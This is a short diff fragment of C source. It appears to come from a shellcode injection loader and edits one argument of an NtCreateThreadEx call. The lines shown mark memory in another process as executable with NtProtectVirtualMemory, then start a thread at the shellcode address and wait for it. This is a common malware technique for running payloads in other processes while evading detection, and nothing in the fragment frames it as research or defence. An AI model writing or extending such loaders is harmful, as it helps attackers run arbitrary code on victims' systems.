@@ -37,7 +37,7 @@ int main(){
 		ULONG OldAccess = NULL;
 		NtProtectVirtualMemory(hProc, &alloc_shellcode, &ShellCodeSize, PAGE_EXECUTE_READ, &OldAccess);
 		HANDLE hThread = 0;
-		NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProc, alloc_shellcode, NULL, NULL,0,NULL,NULL,NULL);
+		NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProc, alloc_shellcode, NULL, NULL,NULL,NULL,NULL,NULL);
 		if (hThread) {
 			WaitForSingleObject(hThread, INFINITE);
 			CloseHandle(hThread);
